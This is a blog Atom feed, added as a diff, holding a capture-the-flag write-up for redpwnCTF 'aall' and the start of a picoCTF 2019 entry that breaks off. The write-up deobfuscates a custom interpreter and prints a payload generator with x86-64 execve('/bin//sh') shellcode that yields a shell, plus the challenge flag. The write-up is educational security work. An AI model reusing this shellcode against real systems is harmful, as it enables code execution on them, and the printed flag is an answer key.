@@ -1,0 +1,388 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+	<title> - reversing</title>
+	<link href="/tags/reversing/atom.xml" rel="self" type="application/atom+xml"/>
+  <link href="/"/>
+	<generator uri="https://www.getzola.org/">Zola</generator>
+	<updated>2020-06-25T00:00:00+00:00</updated>
+	<id>/tags/reversing/atom.xml</id>
+	<entry xml:lang="en">
+		<title>redpwnCTF - aall</title>
+		<published>2020-06-25T00:00:00+00:00</published>
+		<updated>2020-06-25T00:00:00+00:00</updated>
+		<link href="/posts/redpwnctf20-aall/" type="text/html"/>
+		<id>/posts/redpwnctf20-aall/</id>
+		<content type="html">&lt;h1 id=&quot;challenge&quot;&gt;Challenge&lt;&#x2F;h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;how many layers of vm are you on&lt;&#x2F;p&gt;
+&lt;p&gt;like,, maybe 5, or 6 right now my dude&lt;&#x2F;p&gt;
+&lt;p&gt;you are like a baby... watch this&lt;&#x2F;p&gt;
+&lt;p&gt;nc 2020.redpwnc.tf 31755&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;p&gt;We&#x27;re also given a &lt;a href=&quot;https:&#x2F;&#x2F;gist.github.com&#x2F;srikavin&#x2F;f6fc3f9cf62155b95868bac16a40ba5a#file-aall-py&quot;&gt;python file&lt;&#x2F;a&gt; and a 
+&lt;a href=&quot;https:&#x2F;&#x2F;gist.github.com&#x2F;srikavin&#x2F;f6fc3f9cf62155b95868bac16a40ba5a#file-dockerfile&quot;&gt;Dockerfile&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;decoding&quot;&gt;Decoding&lt;&#x2F;h1&gt;
+&lt;p&gt;Looking at the python file shows that it writes out a file named &lt;code&gt;breakout.aallo&lt;&#x2F;code&gt; and calls &lt;code&gt;exec&lt;&#x2F;code&gt; on a string after 
+base64-decoding and lzma-uncompressing it. We can modify the file to save the executed file to disk instead. 
+It&#x27;s a &lt;a href=&quot;https:&#x2F;&#x2F;gist.github.com&#x2F;srikavin&#x2F;0cba74ad88e43442154dd341979c9b6d&quot;&gt;python script&lt;&#x2F;a&gt;, but all of the variables are 
+random unicode characters. Although the python interpreter is happy to run the code, it&#x27;s nearly impossible to understand. &lt;&#x2F;p&gt;
+&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
+&lt;p&gt;I wrote a small script to replace all of the unicode characters with a different name:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;color:#323232;&quot;&gt;final &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&amp;#39;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;mapping &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;dict&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;()
+counter &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;c &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;decompressed:
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;c &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;128&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if not &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;c &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;mapping:
+            mapping[c] &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;v&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(counter)
+            counter &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1
+        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;final &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;mapping[c].encode()
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
+        final &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;([c])
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;unpacked1.py&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;wb&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;).write(final)
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;This results in a &lt;a href=&quot;https:&#x2F;&#x2F;gist.github.com&#x2F;srikavin&#x2F;d495f27076450822e0fc4f6cd4dbc62c&quot;&gt;slightly easier to read file&lt;&#x2F;a&gt;:&lt;&#x2F;p&gt;
+&lt;p&gt;I went ahead and renamed all of the variables and cleaned up the file. The &lt;a href=&quot;https:&#x2F;&#x2F;gist.github.com&#x2F;srikavin&#x2F;cce2544f70b8283309ac088d274b3b06&quot;&gt;resulting file&lt;&#x2F;a&gt; 
+was clearly an interpreter. An interpreted program is passed through argv, which is then loaded into interpreter memory 
+(an array). The first two bytes of the program contain the address to start interpreting at.&lt;&#x2F;p&gt;
+&lt;p&gt;The interpreter isn&#x27;t too complicated, but it has an interesting instruction &lt;code&gt;%&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;instr_type &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;%&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
+    idd &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;id&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(memory[registers[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;ip&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;]:]) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;48
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;mmapped &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;mmap.mmap(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, mmap.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;PAGESIZE&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, prot&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;mmap.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;PROT_READ &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;mmap.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;PROT_WRITE &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;mmap.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;PROT_EXEC&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+    c_functype &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int)
+    v3v17v25v21 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ctypes.c_void_p.from_buffer(mmapped)
+    function &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;c_functype(ctypes.addressof(v3v17v25v21))
+    v3v19v57v10 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(memory[registers[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;ip&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;]:]).replace(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\x00&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+    mmapped.write(v3v19v57v10)
+    retVal &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;function(idd)
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;del &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;v3v17v25v21
+    mmapped.close()
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;This instruction mmaps a new block of memory, loads the memory following the instruction pointer&#x27;s current position, 
+and executes it. This means if we somehow insert shellcode into memory, we can execute by using this opcode.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;breakout-aall&quot;&gt;breakout.aall&lt;&#x2F;h2&gt;
+&lt;p&gt;We also have the file &lt;code&gt;breakout.aall&lt;&#x2F;code&gt; which is the program interpreted by this interpreter. I wrote a script to print 
+&lt;a href=&quot;https:&#x2F;&#x2F;gist.github.com&#x2F;srikavin&#x2F;8c49d2d8c90d9f09aa6e6b5ed771c803&quot;&gt;a disassembly&lt;&#x2F;a&gt; of this file. This program, when 
+executed by the interpreter (which is executed by the python interpreter), loads the string 
+&lt;code&gt;https:&#x2F;&#x2F;aaronesau.com&#x2F;files&#x2F;objectively-wrong.png&lt;&#x2F;code&gt; into memory, and then accepts user input.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;breakout.aall&lt;&#x2F;code&gt; acts as an interpreter itself. It has five instructions:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;gt;&lt;&#x2F;code&gt; which increments the stack pointer&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;&lt;&#x2F;code&gt; which decrements the stack pointer&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;+&lt;&#x2F;code&gt; which increments the value at the stack pointer (dereferences the stack pointer and increments the value)&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;-&lt;&#x2F;code&gt; which decrements the value at the stack pointer&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;?&lt;&#x2F;code&gt; which acts as a NOP&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;We can use &lt;code&gt;breakout.aall&lt;&#x2F;code&gt; to write values to memory. Since, the opcodes for &lt;code&gt;breakout.aall&lt;&#x2F;code&gt; is also stored in memory, 
+we can modify the executed opcodes to include a &lt;code&gt;%&lt;&#x2F;code&gt; instruction to execute shellcode. &lt;&#x2F;p&gt;
+&lt;p&gt;The approach is clear: write shellcode to memory, then overwrite parts of &lt;code&gt;breakout.aal&lt;&#x2F;code&gt; in memory to jump to the shellcode.&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;payload-generation&quot;&gt;Payload Generation&lt;&#x2F;h1&gt;
+&lt;p&gt;Conveniently, &lt;code&gt;breakout.aall&lt;&#x2F;code&gt; has a NOP instruction that we can overwrite to &lt;code&gt;%&lt;&#x2F;code&gt; to call shellcode. I wrote a script to 
+generate the payload:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;color:#323232;&quot;&gt;sp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1469
+
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;move_sp_to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(goal):
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;sp
+
+    old_sp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;sp
+    sp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;goal
+
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;goal &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;old_sp:
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&amp;#39;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;goal &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;old_sp:
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&amp;gt;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(goal &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;old_sp)
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;goal &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;old_sp:
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&amp;lt;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(old_sp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;goal)
+
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;write_val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(index, value, initial_value&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;):
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;sp
+
+    ret &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;move_sp_to(index)
+
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;initial_value:
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ret
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;initial_value:
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ret &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;+&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(value &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;initial_value)
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;initial_value:
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ret &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;-&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(initial_value &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;value)
+
+
+payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&amp;quot;
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;previous &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\x01\x00\x8a\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;https:&#x2F;&#x2F;aaronesau.com&#x2F;files&#x2F;ob&amp;#39;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;shellcode &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(shellcode)
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# % INSTR AT 1398
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;write_val(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1398&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x25&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# write payload
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;b &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;shellcode:
+    payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;write_val(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1400 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;i, b, previous[i])
+    i &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# trigger shellcode
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;?&amp;quot;
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(payload)
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Since we can only increment and decrement the values at certain locations, I included the values at the memory location before running the script, so that those addresses could be incremented&#x2F;decremented appropriately.&lt;&#x2F;p&gt;
+&lt;p&gt;Piping the output from this script into the program gives us a shell, and we can get the flag:
+&lt;code&gt;flag{b1ng0!_obl1g4t0ry-sh1tty-cust0m_4rch_ch4l-ftw}&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+</content>
+	</entry>
+	<entry xml:lang="en">
+		<title>picoCTF 2019 - Java Script Kiddie 2</title>
+		<published>2019-10-12T22:48:41.356+00:00</published>
+		<updated>2019-11-14T04:43:58.202+00:00</updated>
+		<link href="/posts/picoctf-2019-java-script-kiddie-2/" type="text/html"/>
+		<id>/posts/picoctf-2019-java-script-kiddie-2/</id>
+		<content type="html">&lt;p&gt;We are given a website, that is nearly identical to Java Script Kiddie 1. The &lt;code&gt;assemble_png&lt;&#x2F;code&gt; function takes in a key of 
+length 32, and manipulates the bytes to decode the &lt;code&gt;src&lt;&#x2F;code&gt; attribute of an image.&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
